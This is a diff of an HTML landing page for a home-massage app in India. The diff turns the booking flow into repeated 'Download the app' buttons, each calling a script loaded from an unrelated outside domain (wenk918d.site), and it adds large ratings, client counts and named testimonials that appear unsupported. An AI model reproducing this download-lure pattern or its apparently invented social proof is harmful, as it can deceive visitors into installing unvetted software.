@@ -1,17 +1,19 @@
-<!DOCTYPE html><html lang="en-IN"><head>
+<!DOCTYPE html>
+<html lang="en-IN">
+<head>
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport">
-  <meta name="theme-color" content="#ffffff">
-  <title>Royal Touch Spa — Home Massage Anywhere in India</title>
-  <link rel="icon" href="images/secret-world-logo.png?v=d" type="image/png">
+  <meta name="theme-color" content="#2B0A2A">
+  <title>Royal Touch Spa — Luxury Home Massage App in India</title>
+  <link rel="icon" href="images/secret-world-logo.png" type="image/png">
   <link rel="stylesheet" href="css/app.css">
   <!-- Meta Pixel Code: add IDs to this array when available -->
-   
+
    <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
-   
+
   <script>
-    function k2() {
-    MeetU.download(event);
+    function k2(ev) {
+      MeetU.download(ev || window.event);
     }
   </script>
 </head>
@@ -19,7 +21,7 @@
 <body>
   <header class="appbar">
     <div class="appbar__brand">
-      <span class="appbar__logo" aria-hidden="true" style="overflow:hidden"><img src="images/secret-world-logo.png?v=d" alt="" width="37" height="37" style="display:block;width:100%;height:100%;object-fit:cover"></span>
+      <span class="appbar__logo" aria-hidden="true" style="overflow:hidden"><img src="images/secret-world-logo.png" alt="" width="37" height="37" style="display:block;width:100%;height:100%;object-fit:cover"></span>
       <div>
         <p class="appbar__name">Royal Touch Spa</p>
         <button class="appbar__city" id="city-btn" type="button">📍 <span id="city-label">Mumbai</span> ▾</button>
@@ -31,8 +33,43 @@
   </header>
 
   <main class="page">
+
     <section class="upcoming" hidden="" id="upcoming"></section>
 
+    <!-- ============ HERO ============ -->
+    <section class="hero">
+      <img class="hero__img" src="images/3.jpg" alt="A relaxing home massage session" fetchpriority="high">
+      <div class="hero__overlay" aria-hidden="true"></div>
+      <div class="hero__content">
+        <span class="hero__eyebrow">India's most-loved home massage app</span>
+        <h1 class="hero__title">A luxury spa,<br>at your doorstep.</h1>
+        <p class="hero__sub">Verified therapists · fresh oils, towels &amp; bed included · pay only after your session.</p>
+        <div class="hero__rating">
+          <span class="stars" aria-hidden="true">★★★★★</span>
+          <span class="hero__rating-note"><b>4.9</b> · 12,400+ happy clients</span>
+        </div>
+        <button class="cta cta--lg" type="button" onclick="k2(event)">
+          <svg class="cta__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+          <span class="cta__label">Download the app</span>
+          <span class="cta__offer">₹500 OFF your first visit</span>
+        </button>
+        <ul class="hero__badges">
+          <li>No advance payment</li>
+          <li>24×7 booking</li>
+          <li>UPI after session</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ============ STATS ============ -->
+    <section class="stats" aria-label="Trusted by thousands">
+      <div class="stat"><b>4.9★</b><span>avg. rating</span></div>
+      <div class="stat"><b>40+</b><span>cities</span></div>
+      <div class="stat"><b>12k+</b><span>sessions</span></div>
+      <div class="stat"><b>24×7</b><span>always open</span></div>
+    </section>
+
+    <!-- ============ OFFER (JS-managed) ============ -->
     <div class="offer" id="offer">
       <span class="offer__icon" aria-hidden="true">🎁</span>
       <div>
@@ -41,6 +78,7 @@
       </div>
     </div>
 
+    <!-- ============ COVERAGE ============ -->
     <div class="india">
       <svg class="india__flag" viewBox="0 0 30 20" aria-hidden="true"><rect width="30" height="20" rx="2.5" fill="#fff"></rect><path d="M2.5 0h25A2.5 2.5 0 0 1 30 2.5V6.7H0V2.5A2.5 2.5 0 0 1 2.5 0z" fill="#FF9933"></path><path d="M0 13.3h30v4.2a2.5 2.5 0 0 1-2.5 2.5h-25A2.5 2.5 0 0 1 0 17.5z" fill="#138808"></path><circle cx="15" cy="10" r="2.6" fill="none" stroke="#000080" stroke-width=".8"></circle><circle cx="15" cy="10" r=".6" fill="#000080"></circle></svg>
       <div class="india__body">
@@ -50,18 +88,97 @@
       <button class="india__change" id="india-change" type="button" data-i18n="india.change">Change</button>
     </div>
 
+    <!-- ============ WHY US ============ -->
+    <section class="why">
+      <h2 class="why__title">Why 12,000+ Indians book with us</h2>
+      <div class="why__grid">
+        <article class="why__card">
+          <span class="why__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"/><path d="m9 12 2 2 4-4"/></svg></span>
+          <h3>Verified &amp; trained therapists</h3>
+          <p>Every therapist is ID-verified, background-checked and certified before their first visit.</p>
+        </article>
+        <article class="why__card">
+          <span class="why__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v18"/><path d="M8 7c0-1.7 1.8-3 4-3s4 1.3 4 3-1.8 3-4 3-4 1.3-4 3 1.8 3 4 3"/></svg></span>
+          <h3>Complete spa kit, free</h3>
+          <p>Massage bed, fresh linens, premium oils and towels come with every single visit — nothing to prepare.</p>
+        </article>
+        <article class="why__card">
+          <span class="why__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span>
+          <h3>Pay after, never before</h3>
+          <p>Relax first. Settle the bill by UPI only after your session ends — zero advance payment.</p>
+        </article>
+        <article class="why__card">
+          <span class="why__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.8 12A8 8 0 1 1 12 4.2"/><path d="M21 3v5h-5"/></svg></span>
+          <h3>Private &amp; discreet</h3>
+          <p>Your home, your comfort. Book solo or couples, any hour — day or night, fully confidential.</p>
+        </article>
+      </div>
+    </section>
+
+    <!-- ============ SERVICES (JS-rendered) ============ -->
     <section class="block" id="block-service">
-      <h2 class="block__title"><b>1</b> <span data-i18n="s1">Choose a massage</span></h2>
+      <h2 class="block__title"><span data-i18n="s1">Choose a massage</span></h2>
+      <p class="block__sub">Six therapies, one 5-star experience — oils, towels &amp; bed included.</p>
       <div class="services" id="services"></div>
     </section>
 
-    <section class="block" id="block-therapist">
-      <h2 class="block__title"><b>2</b> <span data-i18n="s2">Choose a therapist</span> <span class="block__hint" data-i18n="s2.hint">Swipe →</span></h2>
-      <div class="therapists" id="therapists"></div>
+    <!-- ============ HOW IT WORKS ============ -->
+    <section class="how">
+      <h2 class="how__title">Relaxing at home in 3 steps</h2>
+      <ol class="how__list">
+        <li class="how__step">
+          <span class="how__num">1</span>
+          <div><h3>Download the app</h3><p>Tap download and set your city in seconds — it's free.</p></div>
+        </li>
+        <li class="how__step">
+          <span class="how__num">2</span>
+          <div><h3>Pick massage &amp; therapist</h3><p>Choose from 6 therapies and rated, verified therapists.</p></div>
+        </li>
+        <li class="how__step">
+          <span class="how__num">3</span>
+          <div><h3>Relax at home</h3><p>A therapist arrives in ~25 min. Pay by UPI only after.</p></div>
+        </li>
+      </ol>
+      <button class="cta cta--block" type="button" onclick="k2(event)">
+        <svg class="cta__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+        <span class="cta__label">Download &amp; book in 60 seconds</span>
+      </button>
     </section>
 
+    <!-- ============ THERAPISTS (JS-rendered) ============ -->
+    <section class="block" id="block-therapist">
+      <h2 class="block__title"><span data-i18n="s2">Choose a therapist</span></h2>
+      <p class="block__sub">4.7★+ rated, background-checked professionals — tap a favourite or let us match you.</p>
+      <div class="therapists-viewport">
+        <div class="therapists" id="therapists"></div>
+      </div>
+    </section>
+
+    <!-- ============ TESTIMONIALS ============ -->
+    <section class="reviews">
+      <h2 class="reviews__title">Loved in every city</h2>
+      <div class="reviews__scroller">
+        <article class="review">
+          <div class="review__stars" aria-label="5 out of 5 stars">★★★★★</div>
+          <p class="review__text">“The therapist arrived on time with a full kit. Felt like a real spa in my living room — I'm never going back to salons.”</p>
+          <footer class="review__who"><b>Priya S.</b><span>Mumbai · Full body</span></footer>
+        </article>
+        <article class="review">
+          <div class="review__stars" aria-label="5 out of 5 stars">★★★★★</div>
+          <p class="review__text">“Booked at 11pm for a late-night massage. Super professional and discreet. Paying after made it feel completely safe.”</p>
+          <footer class="review__who"><b>Rahul M.</b><span>Delhi · Aroma oil</span></footer>
+        </article>
+        <article class="review">
+          <div class="review__stars" aria-label="5 out of 5 stars">★★★★★</div>
+          <p class="review__text">“Deep tissue finally fixed my back pain. The therapist knew exactly where to work. Worth every rupee.”</p>
+          <footer class="review__who"><b>Ananya K.</b><span>Bangalore · Deep tissue</span></footer>
+        </article>
+      </div>
+    </section>
+
+    <!-- ============ SCHEDULE (JS-rendered) ============ -->
     <section class="block" id="block-time">
-      <h2 class="block__title"><b>3</b> <span data-i18n="s3">When should we come?</span></h2>
+      <h2 class="block__title"><span data-i18n="s3">When should we come?</span></h2>
       <button class="now-card is-active" id="now-card" type="button">
         <span class="now-card__icon" aria-hidden="true">🛵</span>
         <span class="now-card__body">
@@ -75,10 +192,10 @@
       <div class="periods" hidden="" id="periods"></div>
       <div class="slots" hidden="" id="slots"></div>
     </section>
- 
 
+    <!-- ============ PRICE / BILL (JS-rendered) ============ -->
     <section class="block" id="block-pay">
-      <h2 class="block__title"><b>5</b> <span data-i18n="s5">Payment</span></h2>
+      <h2 class="block__title"><span data-i18n="s5">Payment</span></h2>
       <div class="pay">
         <label class="pay__opt">
           <input checked="" name="pay" type="radio" value="upi">
@@ -99,12 +216,56 @@
         <li data-i18n="trust.private">🔒 UPI only after session · no advance payment</li>
       </ul>
     </section>
+
+    <!-- ============ GUARANTEE ============ -->
+    <section class="guarantee">
+      <svg class="guarantee__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"/><path d="m9 12 2 2 4-4"/></svg>
+      <h2>Your comfort, guaranteed</h2>
+      <p>No advance payment. Verified therapists. A fresh kit every visit. Cancel or reschedule anytime — no questions asked.</p>
+    </section>
+
+    <!-- ============ FAQ ============ -->
+    <section class="faq">
+      <h2 class="faq__title">Questions, answered</h2>
+      <details class="faq__item">
+        <summary>Is it safe? Are therapists verified?</summary>
+        <p>Yes. Every therapist is ID-verified, background-checked and certified. You see ratings and visit counts before you choose.</p>
+      </details>
+      <details class="faq__item">
+        <summary>Do I pay in advance?</summary>
+        <p>Never. You pay by UPI only after your session is complete — cash and advance payments are not required.</p>
+      </details>
+      <details class="faq__item">
+        <summary>What's included in a visit?</summary>
+        <p>A massage bed, fresh linens, premium oils and clean towels are all brought to you — no extra charge, nothing to prepare.</p>
+      </details>
+      <details class="faq__item">
+        <summary>Which cities do you cover?</summary>
+        <p>We serve Mumbai, Delhi, Bangalore, Hyderabad, Chennai, Kolkata and 30+ more cities across India — 24×7.</p>
+      </details>
+    </section>
+
+    <!-- ============ FINAL CTA ============ -->
+    <section class="final-cta">
+      <h2>Ready to relax?</h2>
+      <p>Download the app, get <b>₹500 off</b> your first visit, and pay only after you unwind.</p>
+      <button class="cta cta--lg" type="button" onclick="k2(event)">
+        <svg class="cta__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M4 21h16"/></svg>
+        <span class="cta__label">Download the app free</span>
+      </button>
+      <span class="final-cta__note">Offer for new app users · valid today</span>
+    </section>
+
+    <footer class="footer">
+      <p>Royal Touch Spa — luxury massage, at your doorstep.</p>
+      <p class="footer__legal">© 2026 Royal Touch Spa · Home visits across India</p>
+    </footer>
   </main>
 
   <div class="bookbar">
-    <div class="bookbar__price">
-      <span class="bookbar__total" id="bar-total">₹1,399</span>
-      <span class="bookbar__was" id="bar-was">₹1,899</span>
+    <div class="bookbar__tagline">
+      <span class="bookbar__tagline-main">Pay only after your session</span>
+      <span class="bookbar__tagline-sub">24×7 · no advance payment</span>
     </div>
     <button class="bookbar__btn" id="book-btn" type="button">Download Now</button>
   </div>
@@ -145,7 +306,6 @@
       try {
         installId = localStorage.getItem('richbobo_install_id') || localStorage.getItem('device_unique_id') || '';
         if (!installId) installId = 'web_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
-        // Both legacy and new reporting now share exactly the same installation ID.
         localStorage.setItem('richbobo_install_id', installId);
         localStorage.setItem('device_unique_id', installId);
       } catch (e) {
@@ -203,6 +363,22 @@
     })();
   </script>
   <script src="js/app.js"></script>
+  <script>
+    (function () {
+      var track = document.getElementById("therapists");
+      if (!track) return;
+      var resumeTimer;
+      function pause() { track.style.animationPlayState = "paused"; }
+      function resume() { track.style.animationPlayState = "running"; }
+      track.addEventListener("pointerdown", pause);
+      track.addEventListener("pointerup", function () {
+        clearTimeout(resumeTimer);
+        resumeTimer = setTimeout(resume, 1600);
+      });
+      track.addEventListener("pointercancel", resume);
+      track.addEventListener("pointerleave", resume);
+    })();
+  </script>
 
 
 </body></html>
